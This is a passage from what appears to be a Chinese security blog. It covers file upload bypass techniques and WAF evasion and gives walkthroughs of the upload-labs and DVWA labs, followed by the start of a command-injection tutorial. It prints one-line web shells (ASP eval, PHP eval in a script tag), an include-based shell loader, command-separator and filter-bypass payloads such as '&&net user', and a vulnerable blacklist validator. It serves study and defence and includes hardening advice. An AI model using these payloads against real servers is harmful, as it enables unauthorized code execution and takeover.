src="https://images.seebug.org/content/images/2018/04/cd2f1355-be07-4c63-a802-0aa991bf2197.png-w331s" alt="img"></p><p>可以将垃圾数据加上Content-Disposition参数后面，参数内容过长，可能会导致waf检测出错。</p><h5 id="2-filename"><a href="#2-filename" class="headerlink" title="2 filename"></a>2 filename</h5><p>针对早期版本安全狗，可以多加一个filename</p><p><img src="https://images.seebug.org/content/images/2018/04/0bd2ce6f-25e0-4f59-b004-957ff71b1fd9.png-w331s" alt="img"></p><p>或者将filename换位置，在IIS6.0下如果我们换一种书写方式，把filename放在其他地方：</p><p><img src="https://images.seebug.org/content/images/2018/04/d86eaa81-9a84-40dc-9347-6c5bfdbfeaf6.png-w331s" alt="img"></p><h5 id="3-POST-GET"><a href="#3-POST-GET" class="headerlink" title="3 POST/GET"></a>3 POST/GET</h5><p>有些WAF的规则是：如果数据包为POST类型，则校验数据包内容。 此种情况可以上传一个POST型的数据包，抓包将POST改为GET。</p><h5 id="4-以上方式"><a href="#4-以上方式" class="headerlink" title="4 以上方式"></a>4 以上方式</h5><p>针对WAF，以上介绍的服务器解析漏洞、文件包含漏洞等都可以尝试绕过。</p><p>**</p><h5 id="5-利用waf本身缺陷"><a href="#5-利用waf本身缺陷" class="headerlink" title="5 利用waf本身缺陷"></a>5 利用waf本身缺陷</h5><h6 id="删除实体里面的Conten-Type字段"><a href="#删除实体里面的Conten-Type字段" class="headerlink" title="删除实体里面的Conten-Type字段"></a>删除实体里面的Conten-Type字段</h6><p><img src="https://images.seebug.org/content/images/2018/04/f7b360e4-e055-43b7-ae94-b98419256476.png-w331s" alt="img"></p><p>第一种是删除Content整行，第二种是删除C后面的字符。删除掉ontent-Type: image/jpeg只留下c，将.php加c后面即可，但是要注意额，双引号要跟着c.php。</p><pre class=" language-html"><code class="language-html">正常包：Content-Disposition: form-data; name="image"; filename="085733uykwusqcs8vw8wky.png"Content-Type: image/png构造包：Content-Disposition: form-data; name="image"; filename="085733uykwusqcs8vw8wky.pngC.php"</code></pre><h6 id="删除Content-Disposition字段里的空格"><a href="#删除Content-Disposition字段里的空格" class="headerlink" title="删除Content-Disposition字段里的空格"></a>删除Content-Disposition字段里的空格</h6><p><img src="https://images.seebug.org/content/images/2018/04/1ca10020-3739-4def-b0e1-f4b004a1f196.png-w331s" alt="img"></p><p>增加一个空格导致安全狗被绕过案列： Content-Type: multipart/form-data; boundary=—————————4714631421141173021852555099 尝试在boundary后面加个空格或者其他可被正常处理的字符： boundary= —————————47146314211411730218525550</p><h6 id="修改Content-Disposition字段值的大小写"><a href="#修改Content-Disposition字段值的大小写" class="headerlink" title="修改Content-Disposition字段值的大小写"></a>修改Content-Disposition字段值的大小写</h6><p><img src="https://images.seebug.org/content/images/2018/04/ae0437ec-b9f5-48db-a28f-75408445c23f.png-w331s" alt="img"></p><h6 id="Boundary边界不一致"><a href="#Boundary边界不一致" class="headerlink" title="Boundary边界不一致"></a>Boundary边界不一致</h6><p>每次文件上传时的Boundary边界都是一致的：</p><pre><code>Content-Type: multipart/form-data; boundary=---------------------------4714631421141173021852555099Content-Length: 253-----------------------------4714631421141173021852555099Content-Disposition: form-data; name=&quot;file1&quot;; filename=&quot;shell.asp&quot;Content-Type: application/octet-stream&lt;%eval request(&quot;a&quot;)%&gt;-----------------------------4714631421141173021852555099--</code></pre><p>但如果容器在处理的过程中并没有严格要求一致的话可能会导致一个问题，两段Boundary不一致使得waf认为这段数据是无意义的，可是容器并没有那么严谨： Win2k3 + IIS6.0 + ASP</p><p><img src="https://images.seebug.org/content/images/2018/04/c4f02267-e336-41c1-9423-3c86fa81856b.png-w331s" alt="img"></p><h6 id="文件名处回车"><a href="#文件名处回车" class="headerlink" title="文件名处回车"></a>文件名处回车</h6><p><img src="https://images.seebug.org/content/images/2018/04/80c9d74a-d9bc-411c-af2a-a704eb5e1aff.png-w331s" alt="img"></p><h6 id="多个Content-Disposition"><a href="#多个Content-Disposition" class="headerlink" title="多个Content-Disposition"></a>多个Content-Disposition</h6><p>在IIS的环境下，上传文件时如果存在多个Content-Disposition的话，IIS会取第一个Content-Disposition中的值作为接收参数，而如果waf只是取最后一个的话便会被绕过，Win2k8 + IIS7.0 + PHP</p><p><img src="https://images.seebug.org/content/images/2018/04/6b945737-c4b4-4350-a5ba-972b35b09fda.png-w331s" alt="img"></p><h5 id="利用NTFS-ADS特性"><a href="#利用NTFS-ADS特性" class="headerlink" title="利用NTFS ADS特性"></a>利用NTFS ADS特性</h5><p>ADS是NTFS磁盘格式的一个特性，用于NTFS交换数据流。在上传文件时，如果waf对请求正文的filename匹配不当的话可能会导致绕过。</p><p><img src="https://images.seebug.org/content/images/2018/04/b3625731-9f1d-4889-8609-b357b61a2368.png-w331s" alt="img"></p><h5 id="文件重命名绕过"><a href="#文件重命名绕过" class="headerlink" title="文件重命名绕过"></a>文件重命名绕过</h5><p>如果web程序会将filename除了扩展名的那段重命名的话，那么还可以构造更多的点、符号等等。</p><p><img src="https://images.seebug.org/content/images/2018/04/95eabfd7-54b0-4f0f-971f-2316423fac33.png-w331s" alt="img"></p><h5 id="特殊的长文件名绕过"><a href="#特殊的长文件名绕过" class="headerlink" title="特殊的长文件名绕过"></a>特殊的长文件名绕过</h5><p>文件名使用非字母数字，比如中文等最大程度的拉长，不行的话再结合一下其他的特性进行测试：</p><p>shell.asp;王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王.jpg</p><h5 id="反删除"><a href="#反删除" class="headerlink" title="反删除"></a>反删除</h5><p>将下图file1改成了file4，这样就不会把这个文件删除了。（JCMS漏洞）</p><p><img src="https://images.seebug.org/content/images/2018/04/389b0352-5ba1-4d7c-8d77-198dab060856.png-w331s" alt="img"></p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><pre class=" language-html"><code class="language-html">条件： 寻找一个上传点，查看上传点是否可用。利用：首先判断是程序员自己写的上传点，还是编辑器的上传功能如果是编辑器上传功能，goolge当前编辑器的漏洞如果是程序员写的上传点上传一个正常的jpg图片 查看上传点是否可用上传一个正常的jpg图片，burp拦截，修改后缀为php (可以检测前端验证 MIME检测 文件内容检测 后缀检测）上传一个正常的jpg图片，burp拦截， 00截断 1.php%00.jpg判断服务器是什么类型，web服务器程序，是什么类型，版本号多少利用解析漏洞</code></pre><h4 id="防护建议"><a href="#防护建议" class="headerlink" title="防护建议"></a>防护建议</h4><ol><li>使用白名单限制可以上传的文件扩展（白名单比黑名单可靠多了）</li><li>验证文件内容，使用正则匹配恶意代码限制上传</li><li>对上传后的文件统一随机命名，不允许用户控制扩展名</li><li>修复服务器可能存在的解析漏洞</li><li>严格限制可以修改服务器配置的文件上传如：.htaccess</li><li>隐藏上传文件路径。</li><li>升级Web Server</li><li>及时修复Web上传代码（重要）</li><li>不能有本地文件包含漏洞</li><li>注意0x00截断攻击（PHP更新到最新版本）</li><li>上传文件的存储目录禁用执行权限</li></ol><h3 id="文件上传漏洞的主要利用和绕过方式总结。"><a href="#文件上传漏洞的主要利用和绕过方式总结。" class="headerlink" title="文件上传漏洞的主要利用和绕过方式总结。"></a>文件上传漏洞的主要利用和绕过方式总结。</h3><p><strong>1.前端JS绕过</strong></p><p>基于本地验证文件是否符合要求：直接将<strong>JavaScript</strong>禁用。或者burp抓包后修改后缀，将php文件后缀现先改为jpg，burp抓包后后缀改回php。</p><p><strong>2.MIME 类型验证</strong></p><p>burp抓包将<strong>Content-type</strong>类型修改为image/jpeg，image/png等</p><p><strong>3.黑名单验证</strong></p><p>1.寻找没有过滤的类型：phtml php3 php4 php5  PHP phtml</p><p>2.大小写绕过：例如Php</p><p><strong>4.文件内容验证</strong></p><p>1<strong>.getimagesize()函数获取图像信息</strong>：通过构造图片马进行绕过。</p><p>2.<strong>文件头绕过</strong>：例如 GIF89a <?php phpinfo(); ?></p><p>2.<strong>检验关键字</strong>&lt;?php:利用script标签绕过：<code>&lt;script language=&quot;php&quot;&gt;eval($_POST[&#39;hack&#39;]);&lt;/script&gt;</code></p><p><strong>6. .htaccess上传</strong></p><p>上传的.jpg文件都会以php格式解析</p><p>.htaccess内容</p><pre><code>AddType   application/x-httpd-php     .jpg</code></pre><p>这里代码的意思可以让 .jpg后缀名文件格式的文件名以php格式解析，因此达到了可执行的效果。所以我们可以把要上传的php文件的后缀名改为.jpg格式从而绕过</p><p><strong>7.00截断绕过</strong></p><p>php.   jpg  将空格二进制20改为00；</p><p><strong>8.win系统解析漏洞绕过</strong></p><p>1.上传1.php(或者图片马)，抓包修改为1.php.</p><p>2.上传1.php(或者图片马)，抓包修改为1.php::$DATA</p><p>3.上传1.php(或者图片马)，抓包修改为1.php:1.jpg</p><p>4.上传1.php(或者图片马)，抓包修改为1.php::$DATA…….</p><p><strong>9.文件包含绕过</strong>：首先上传图片木马shell.jpg，然后上传可以进行文件包含的php文件,比如上传1.php</p><pre class=" language-php"><code class="language-php"><span class="token variable">$x</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'x'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>然后我们访问1.php?x=shell.jpg即可。</p><p><strong>10.条件竞争绕过</strong></p><p>通过BURP不断发包，导致不断写入webshell,再写入速度频率上超过安全软件查杀频率，导致绕过。</p><p><strong>11.二次渲染绕过</strong></p><p>上传图片加载后，会对图片进行二次渲养，改变大部分图片源码，绕过为：对照上传后的图片与原图片放在winhex中对不，查看图片哪个数据块没有被改变。将木马代码放在没有改变的一块中，在不损坏图片的前提下，即可绕过上传</p><p><strong>12.中间件解析漏洞</strong></p><p>apache：上传图片马，抓包修改为1.php.xxxx.abc</p><p>iis6.0 6.5：上传图片马，抓包修改猴嘴为.asa、.cer和.cdx等。</p><p>​                    上传图片马，抓包修改为1.asp;.jpg或者%00 /00也可以</p><p>​                    上传图片马，抓包发现有保存图片的路径，如../upload/image</p><p>nginx: 上传图片马，拿到图片马的路径，访问的时候加上/.php 就可作为php文件解析,如         </p><p>​            upload/image/1.jpg/.php</p><p>tomcat:弱口令进入后台，上传war包即可，shell.jsp–&gt;shell.zip–&gt;shell.war</p><h3 id="靶场：upload-labs-实战总结"><a href="#靶场：upload-labs-实战总结" class="headerlink" title="靶场：upload-labs 实战总结"></a>靶场：upload-labs 实战总结</h3><p><strong>upolad-labs考察知识点汇总：</strong></p><img src="11525934-e19630249b9b8764.png"  /><p>​    upload-labs是一个使用php语言编写的，专门收集渗透测试和CTF中遇到的各种上传漏洞的靶场。旨在帮助大家对上传漏洞有一个全面的了解。目前一共20关，每一关都包含着不同上传方式。</p><h5 id="Pass-01-前端js检测"><a href="#Pass-01-前端js检测" class="headerlink" title="Pass-01-前端js检测"></a>Pass-01-前端js检测</h5><p><strong>考察知识点：</strong>前端js检测，我们可以选择禁用js,或者直接burp直接抓包绕过.。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200115201219.png" alt=""></p><h5 id="Pass-02-只检测Content-type"><a href="#Pass-02-只检测Content-type" class="headerlink" title="Pass-02 只检测Content-type"></a>Pass-02 只检测Content-type</h5><p><strong>考察知识点：</strong>Content-Type绕过，我们直接改为 image/jpeg</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200115201548.png" alt=""></p><h5 id="Pass-03-黑名单绕过"><a href="#Pass-03-黑名单绕过" class="headerlink" title="Pass-03 黑名单绕过"></a>Pass-03 黑名单绕过</h5><p><strong>考察知识点：</strong>黑名单绕过，禁止上传.asp|.aspx|.php|.jsp后缀文件，但是我们可以上传.php3 .phtml .php5另类后缀名。</p><h5 id="Pass-04-htaccess绕过"><a href="#Pass-04-htaccess绕过" class="headerlink" title="Pass-04  .htaccess绕过"></a>Pass-04  .htaccess绕过</h5><p><strong>考察知识点：</strong>构造.htaccess文件，内容为<code>AddType  application/x-httpd-php  .jpg</code></p><p>我们首先上传.htaccess文件，</p><img src="QQ截图20200124121848.png" style="zoom: 80%;" /><p>然后上传我们事先准备好的php文件将后缀改为.jpg文件,</p><img src="QQ截图20200124122245.png" style="zoom:150%;" /><p>可以在本地看到成功上传。</p><h5 id="Pass-05-大小写绕过"><a href="#Pass-05-大小写绕过" class="headerlink" title="Pass-05 大小写绕过"></a>Pass-05 大小写绕过</h5><p><strong>考察知识点：</strong>因为此次黑名单过滤了.htaccess，但是没有将文件名转换为小写。所以我们可以通过大小写绕过。</p><img src="QQ截图20200124124135.png" style="zoom: 80%;" /><h5 id="Pass-06-空格绕过"><a href="#Pass-06-空格绕过" class="headerlink" title="Pass-06 空格绕过"></a>Pass-06 空格绕过</h5><p><strong>考察知识点</strong>：修改文件后缀为<code>1.php空格</code>.,利用.php[空格]绕过黑名单，然后利用windows的文件命名规则默认除去空格,达到上传.php的目的</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200124124135.png" alt=""></p><h5 id="Pass-07-点绕过"><a href="#Pass-07-点绕过" class="headerlink" title="Pass-07 点绕过"></a>Pass-07 点绕过</h5><p><strong>考察知识点：</strong>wIndow命名规则:window下 xx.php空格xx.php.不允许存在，系统会默认去除空格或点。此处过滤了空格，但是没有过滤点。我们用burp将文件后缀改为php.即可。</p><img src="QQ截图20200124130943.png" style="zoom:150%;" /><h5 id="Pass-08-DATA绕过"><a href="#Pass-08-DATA绕过" class="headerlink" title="Pass-08  ::$DATA绕过"></a>Pass-08  ::$DATA绕过</h5><p><strong>考察知识点</strong>：$DATA绕过：在php+windows的情况下：如果文件名+”::$DATA”会把::$DATA之后的数据当成文件流处理,不会检测后缀名.且保持”::$DATA”之前的文件名。</p><p>所以：文件后缀改为：<code>xx.php::$DATA</code>即可</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200115202909.png" alt=""></p><h5 id="Pass-09-点空格点绕过"><a href="#Pass-09-点空格点绕过" class="headerlink" title="Pass-09 点空格点绕过"></a>Pass-09 点空格点绕过</h5><p>这里我们分析一下源代码：</p><pre class=" language-php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token constant">UPLOAD_PATH</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$deny_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">".php"</span><span class="token punctuation">,</span><span class="token string">".php5"</span><span class="token punctuation">,</span><span class="token string">".php4"</span><span class="token punctuation">,</span><span class="token string">".php3"</span><span class="token punctuation">,</span><span class="token string">".php2"</span><span class="token punctuation">,</span><span class="token string">".html"</span><span class="token punctuation">,</span><span class="token string">".htm"</span><span class="token punctuation">,</span><span class="token string">".phtml"</span><span class="token punctuation">,</span><span class="token string">".pht"</span><span class="token punctuation">,</span><span class="token string">".pHp"</span><span class="token punctuation">,</span><span class="token string">".pHp5"</span><span class="token punctuation">,</span><span class="token string">".pHp4"</span><span class="token punctuation">,</span><span class="token string">".pHp3"</span><span class="token punctuation">,</span><span class="token string">".pHp2"</span><span class="token punctuation">,</span><span class="token string">".Html"</span><span class="token punctuation">,</span><span class="token string">".Htm"</span><span class="token punctuation">,</span><span class="token string">".pHtml"</span><span class="token punctuation">,</span><span class="token string">".jsp"</span><span class="token punctuation">,</span><span class="token string">".jspa"</span><span class="token punctuation">,</span><span class="token string">".jspx"</span><span class="token punctuation">,</span><span class="token string">".jsw"</span><span class="token punctuation">,</span><span class="token string">".jsv"</span><span class="token punctuation">,</span><span class="token string">".jspf"</span><span class="token punctuation">,</span><span class="token string">".jtml"</span><span class="token punctuation">,</span><span class="token string">".jSp"</span><span class="token punctuation">,</span><span class="token string">".jSpx"</span><span class="token punctuation">,</span><span class="token string">".jSpa"</span><span class="token punctuation">,</span><span class="token string">".jSw"</span><span class="token punctuation">,</span><span class="token string">".jSv"</span><span class="token punctuation">,</span><span class="token string">".jSpf"</span><span class="token punctuation">,</span><span class="token string">".jHtml"</span><span class="token punctuation">,</span><span class="token string">".asp"</span><span class="token punctuation">,</span><span class="token string">".aspx"</span><span class="token punctuation">,</span><span class="token string">".asa"</span><span class="token punctuation">,</span><span class="token string">".asax"</span><span class="token punctuation">,</span><span class="token string">".ascx"</span><span class="token punctuation">,</span><span class="token string">".ashx"</span><span class="token punctuation">,</span><span class="token string">".asmx"</span><span class="token punctuation">,</span><span class="token string">".cer"</span><span class="token punctuation">,</span><span class="token string">".aSp"</span><span class="token punctuation">,</span><span class="token string">".aSpx"</span><span class="token punctuation">,</span><span class="token string">".aSa"</span><span class="token punctuation">,</span><span class="token string">".aSax"</span><span class="token punctuation">,</span><span class="token string">".aScx"</span><span class="token punctuation">,</span><span class="token string">".aShx"</span><span class="token punctuation">,</span><span class="token string">".aSmx"</span><span class="token punctuation">,</span><span class="token string">".cEr"</span><span class="token punctuation">,</span><span class="token string">".sWf"</span><span class="token punctuation">,</span><span class="token string">".swf"</span><span class="token punctuation">,</span><span class="token string">".htaccess"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">deldot</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//删除文件名末尾的点</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span> <span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//转换为小写</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string">'::$DATA'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//去除字符串::$DATA</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//首尾去空</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span> <span class="token variable">$deny_ext</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token punctuation">.</span><span class="token string">'/'</span><span class="token punctuation">.</span><span class="token variable">$file_name</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">'上传出错！'</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">'此文件类型不允许上传！'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token punctuation">.</span> <span class="token string">'文件夹不存在,请手工创建！'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>这里其实已经过滤的很严格了。</p><p>依次进行了严格的黑名单过滤、转换大小写、去除文件名尾的空格和点。还去除了;$DATA.</p><p>但是这里存在很明显的代码逻辑漏洞：代码<strong>去点，除空</strong>的操作只进行了一次。那么我们把后缀名改为</p><p><strong>php. .</strong> 点 空格点的格式。最后的后缀名为<strong>.php.</strong> 成功绕过。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200115204443.png" alt=""></p><h5 id="Pass-10-双写绕过"><a href="#Pass-10-双写绕过" class="headerlink" title="Pass-10 双写绕过"></a>Pass-10 双写绕过</h5><p>考察知识点:双写绕过，这里利用了<code>str_irepalce</code>函数将不符合上传的后缀名替换为空，且该函数对 大小写不敏感，我们可以通过双写后缀名 .pphphp进行绕过。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200115205208.png" alt=""></p><h5 id="Pass-11-get-00截断"><a href="#Pass-11-get-00截断" class="headerlink" title="Pass-11 get 00截断"></a>Pass-11 get 00截断</h5><p>考察知识点：00截断</p><img src="QQ截图20200124131542.png" style="zoom:50%;" /><p><strong>Pass-12 Post 00截断</strong></p><p>考察知识点：00截断</p><p>和十一关不同的是这次的save_path是通过post传进来的，还是利用00截断，但这次需要在二进制中进行修改，因为post不会像get对%00进行自动解码</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200128202954.png" alt=""></p><p><img src="QQ%E6%88%AA%E5%9B%BE20200128203026.png" alt=""></p><h4 id="Pass-13"><a href="#Pass-13" class="headerlink" title="Pass-13"></a>Pass-13</h4><p>考察知识点：图片马，结合文件包含</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200115211730.png" alt=""></p><p><img src="QQ%E6%88%AA%E5%9B%BE20200115211949.png" alt=""></p><h5 id="拓展资料"><a href="#拓展资料" class="headerlink" title="拓展资料"></a>拓展资料</h5><ul><li><a href="http://thief.one/2016/09/21/服务器解析漏洞/" target="_blank" rel="noopener">http://thief.one/2016/09/21/服务器解析漏洞/</a></li></ul><h5 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h5><ul><li><a href="http://www.y-hkl.top/2017/09/16/文件上传漏洞解析及绕过姿势/" target="_blank" rel="noopener">文件上传漏洞解析及绕过姿势</a></li><li><a href="http://www.cnblogs.com/stevenwuzheng/p/5354236.html" target="_blank" rel="noopener">http://www.cnblogs.com/stevenwuzheng/p/5354236.html</a></li><li><a href="https://blog.csdn.net/weiwangchao_/article/details/46686505" target="_blank" rel="noopener">https://blog.csdn.net/weiwangchao_/article/details/46686505</a></li><li><a href="http://www.myh0st.cn/index.php/archives/7/" target="_blank" rel="noopener">http://www.myh0st.cn/index.php/archives/7/</a></li><li><a href="http://rdc.hundsun.com/portal/article/627.html" target="_blank" rel="noopener">http://rdc.hundsun.com/portal/article/627.html</a></li><li><a href="http://jdrops.dropsec.xyz/2017/07/17/文件上传漏洞总结/" target="_blank" rel="noopener">文件上传漏洞总结</a></li><li><a href="https://thief.one/2016/09/22/上传木马姿势汇总-欢迎补充/" target="_blank" rel="noopener">文件上传漏洞（绕过姿势）</a></li><li><a href="http://wyb0.com/posts/file-upload-editor-upload-vulnerability/" target="_blank" rel="noopener">http://wyb0.com/posts/file-upload-editor-upload-vulnerability/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> web漏洞学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件上传漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>命令执行/代码执行漏洞学习</title>
      <link href="/2020/04/03/ming-ling-zhi-xing-dai-ma-zhi-xing-lou-dong-xue-xi/"/>
      <url>/2020/04/03/ming-ling-zhi-xing-dai-ma-zhi-xing-lou-dong-xue-xi/</url>
      
        <content type="html"><![CDATA[<h2 id="代码执行-命令执行漏洞学习笔记-靶场实战"><a href="#代码执行-命令执行漏洞学习笔记-靶场实战" class="headerlink" title="代码执行+命令执行漏洞学习笔记+靶场实战"></a>代码执行+命令执行漏洞学习笔记+靶场实战</h2><p>[TOC]</p><h3 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h3><h4 id="一、什么是命令执行漏洞"><a href="#一、什么是命令执行漏洞" class="headerlink" title="一、什么是命令执行漏洞"></a>一、什么是命令执行漏洞</h4><h5 id="命令执行漏洞概念："><a href="#命令执行漏洞概念：" class="headerlink" title="命令执行漏洞概念："></a>命令执行漏洞概念：</h5><p>当应用需要调用一些外部程序去处理内容的情况下，就会用到一些执行系统命令的函数。如PHP中的system，exec，shell_exec等，当用户可以控制命令执行函数中的参数时，将可注入恶意系统命令到正常命令中，造成命令执行攻击。</p><h5 id="漏洞危害："><a href="#漏洞危害：" class="headerlink" title="漏洞危害："></a>漏洞危害：</h5><ul><li>继承web服务器程序的权限，去执行系统命令。</li><li>继承web服务器程序的权限，读取文件</li><li>反弹shell</li><li>控制整个网站甚至控制整个服务器</li></ul><p><strong>常用的Linux命令总结：</strong></p><pre><code>ls cd mkdir rm cp mv touch cat more chmod find vi du ifconfig ping netstat lsof shutdown uname kill...</code></pre><h5 id="命令执行与代码执行的区别："><a href="#命令执行与代码执行的区别：" class="headerlink" title="命令执行与代码执行的区别："></a>命令执行与代码执行的区别：</h5><p>代码执行是通过调用<strong>服务器网站代码</strong>进行执行，而命令注入则是调用<strong>操作系统命令</strong>进行执行。</p><h5 id="常见的命令执行函数："><a href="#常见的命令执行函数：" class="headerlink" title="常见的命令执行函数："></a>常见的命令执行函数：</h5><ul><li><p><strong>system()</strong></p><img src="QQ截图20200121111755.png" style="zoom: 67%;" /> </li></ul><ul><li><p><strong>passthru()</strong></p><img src="QQ截图20200121111928.png" style="zoom: 67%;" /></li></ul><ul><li><strong>exec()</strong></li></ul>  <img src="QQ截图20200121112035.png" style="zoom:67%;" /><ul><li><strong>shell_exec()</strong></li></ul>  <img src="QQ截图20200121112153.png" style="zoom:67%;" /><ul><li><strong>`反引号</strong></li></ul>  <img src="QQ截图20200121112345.png" style="zoom:67%;" /><ul><li><p><strong>ob_start()</strong></p></li><li><p><strong>popen()</strong></p></li><li><p><strong>proc_oprn()</strong></p></li><li><p>。。。</p></li></ul><h5 id="常见的绕过方法"><a href="#常见的绕过方法" class="headerlink" title="常见的绕过方法"></a>常见的绕过方法</h5><p><strong>1.空格过滤绕过</strong></p><p>空格可以用以下字符替换</p><pre><code>&lt;    &lt;&gt;   %20(space)   %09(tab)  $IFS$9  ${IFS}  $IFS等</code></pre><p>  测试：</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200121121710.png" alt=""></p><p>2.<strong>命令分隔符</strong></p><pre><code>linux:%0a、%0d、;、&amp;、|、&amp;&amp;、||、window: %0a、&amp;、|、%1a、</code></pre><img src="QQ截图20200121121840.png" style="zoom:67%;" /><p><strong>%0a符号：</strong>换行符                 <strong>%0d符号：</strong>回车符             <strong><code>;</code>符号：</strong>起连续指令的功能        </p><p><strong>&amp;  &amp;&amp; ||的区别</strong></p><p>（1）&amp; 表示先执行CMD1 再执行CMD2，这里不考虑CMD1是否成功。使用CMD1 &amp; CMD2</p><p>（2）&amp;&amp; 表示先执行CMD1，成功后再执行CMD，否则不执行CMD2。使用CMD1 &amp;&amp; CMD2</p><p>（3）|| 先执行CMD1，CMD1执行成功就不再执行CMD2，CMD1执行失败则执行CMD2。使用CMD1 || CMD2</p><p>3.<strong>敏感字符绕过</strong></p><ul><li><p>利用变量绕过</p><img src="QQ截图20200121122131.png" style="zoom:67%;" /></li><li><p>利用base64编码绕过</p><img src="QQ截图20200121122557.png" style="zoom:67%;" /></li></ul><h4 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><p>1.能使用脚本解决的工作，不要调用其他程序处理，尽量少用执行命令的函数，并在disable_functions中禁用</p><ol start="2"><li>在进入命令执行的函数或方法之前，对参数进行过滤。</li><li>参数的值尽量使用引号包裹，并在拼接前调用addslashes进行转义。</li></ol><h4 id="DVWA-命令注入部分"><a href="#DVWA-命令注入部分" class="headerlink" title="DVWA (命令注入部分)"></a>DVWA (命令注入部分)</h4><h5 id="simple"><a href="#simple" class="headerlink" title="simple"></a>simple</h5><p>由源码可知，要求我们输入ip地址，未进行任何过滤，我们在ip地址后使用&amp;&amp;拼接想要执行的命令。</p><pre><code>127.0.0.1&amp;&amp;net user</code></pre><h5 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h5><pre><code>&lt;?php if( isset( $_POST[ &#39;Submit&#39; 